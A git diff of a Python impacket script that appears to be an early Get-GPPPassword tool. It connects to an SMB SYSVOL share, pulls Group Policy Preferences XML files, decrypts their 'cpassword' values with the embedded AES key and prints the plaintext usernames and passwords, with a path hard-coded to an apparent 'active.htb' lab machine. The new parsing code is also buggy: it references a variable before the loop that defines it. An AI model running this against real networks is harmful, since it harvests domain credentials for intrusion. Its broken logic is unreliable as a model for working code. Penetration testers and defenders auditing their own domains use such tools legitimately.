@@ -1,26 +1,23 @@
 #!/usr/bin/env python
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
-#
-# This software is provided under under a slightly modified version
-# of the Apache Software License. See the accompanying LICENSE file
-# for more information.
-#
-# Description: Mini shell using some of the SMB funcionality of the library
+# todo : licence
+# Description: todo
 #
 # Author:
-#  Alberto Solino (@agsolino)
-#
+#  Remi Gascou (@podalirius_)
+#  Charlie Bromberg (@_nwodtuhs)
 #
 # Reference for:
 #  SMB DCE/RPC
-#
+
 import argparse
 import logging
-import xml.etree.ElementTree as ET
+from xml.dom import minidom
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
 
 from impacket import version
 from impacket.examples import logger
-
 from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
     FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
 from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY
@@ -132,47 +129,61 @@ class GetGPPasswords(object):
         if self.loggedIn is False:
             logging.error("Not logged in")
             return
-        logging.info("Parsing .xml files, looking for cpassword strings")
-
         results = []
-        # newname (newName), changed (changed), passwords (cpassword), usernames (userName), file
         for filename in files:
             # I/O + grep cpassword
             filename = filename.replace('/', '\\')
-            # fh = BytesIO()
-            # try:
-            #     self.smb.getFile(self.share, filename, fh.write)
-            # except:
-            #     raise
-            # output = fh.getvalue()
-            # encoding = chardet.detect(output)["encoding"]
+            fh = BytesIO()
+            try:
+                self.smb.getFile(self.share, filename, fh.write)
+            except:
+                raise
+            output = fh.getvalue()
+            encoding = chardet.detect(output)["encoding"]
             error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
-            encoding = "coucou"
             if encoding != None:
-                try:
-                    # filecontent = output.decode(encoding)
-                    filecontent = '\
-<?xml version="1.0" encoding="utf-8" ?>\
-<Groups clsid="{1bba7d73-d26a-f82e-4427-4048a9209301}">\
-	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2015-02-18 01:53:01" uid="{D5FE7352-81E1-42A2-B7DA-118402BE4C33}">\
-		<Properties action="U" newName="ADSAdmin" fullName="" description="" cpassword="RI133B2Wl2CiI0Cau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bL0Uie0BaZ/7rdQjugTonF3ZWAKa1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthonty="RID_ADMIN" userNarne="Administrator (built-in)" expires="2015-02-17" />\
-	</User>\
-</Groups>'
-                    tree = ET.fromstring(filecontent)
-                    root = tree.getroot()
-                    # todo : below doesn't work
-                    for properties in root.findall('Properties'):
-                        cpassword = properties.find('cpassword').text
-                        logger.info(cpassword)
-                    # todo : parse for the xml args
-                except:
-                    print(error_msg)
-                finally:
+                filecontent = output.decode(encoding)
+                logging.debug(filecontent)
+                root = minidom.parseString(filecontent)
+                properties_list = root.getElementsByTagName("Properties")
+                # todo : handle empty list, no match
+                results.append({
+                    'newname': properties.getAttribute('newName'), # todo : can be empty
+                    'changed': properties.parentNode.getAttribute('changed'),
+                    'cpassword': properties.getAttribute('cpassword'),
+                    'password': self.decrypt_password(properties.getAttribute('cpassword')),
+                    'username': properties.getAttribute('userName'),
+                    'file': filename
+                })
+                for properties in properties_list:
                     pass
-                    # fh.close()
+                fh.close()
             else:
                 print(error_msg)
-                # fh.close()
+                fh.close()
+        return results
+
+    def decrypt_password(self, pw_enc_b64):
+        key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
+              b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
+        iv = b'\x00' * 16
+        pad = len(pw_enc_b64) % 4
+        if pad == 1:
+            pw_enc_b64 = pw_enc_b64[:-1]
+        elif pad == 2 or pad == 3:
+            pw_enc_b64 += '=' * (4 - pad)
+        pw_enc = base64.b64decode(pw_enc_b64)
+        ctx = AES.new(key, AES.MODE_CBC, iv)
+        pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
+        return pw_dec.decode('utf-16-le')
+
+    def show(self, results):
+        for result in results:
+            logging.info(f"NewName\t: {result['newname']}")
+            logging.info(f"Changed\t: {result['changed']}")
+            logging.info(f"Username\t: {result['username']}")
+            logging.info(f"Password\t: {result['password']}")
+            logging.info(f"File\t: {result['file']}\n")
 
 
 def parse_args():
@@ -183,12 +194,13 @@ def parse_args():
     # group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH') # todo : enable this
     # todo : add -root-directories (find another name) (default to Policies)
     # parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON') # todo : enable this
-    parser.add_argument("-P", "--port", type=int, required=False, default=445, help="Server port")
-    parser.add_argument("-u", "--username", type=str, required=False, default="", help="SMB Username")
-    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
-    parser.add_argument("-p", "--password", type=str, required=False, default="", help="SMB Password")
     parser.add_argument("-d", "--domain", type=str, required=False, default="", help="SMB Password")
+    parser.add_argument("-u", "--username", type=str, required=False, default="", help="SMB Username")
+    parser.add_argument("-p", "--password", type=str, required=False, default="", help="SMB Password")
+    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
+    parser.add_argument("-P", "--port", type=int, required=False, default=445, help="Server port")
     parser.add_argument("-verbose", required=False, default=False, action="store_true", help="")
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     return vars(parser.parse_args())
 
 
@@ -197,7 +209,7 @@ if __name__ == '__main__':
     args = parse_args()
 
     # Init the example's logger theme
-    # todo : logger.init(options.ts)
+    logger.init(args['ts'])
 
     if args['verbose'] is True:
         logging.getLogger().setLevel(logging.DEBUG)
@@ -211,6 +223,8 @@ if __name__ == '__main__':
                        verbose=args['verbose'])
     g.login()
     g.list_shares()
-    files = g.find_files()
-    g.parse(files)
+    # files = g.find_files()
+    files = ['/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml']
+    results = g.parse(files)
+    g.show(results)
 
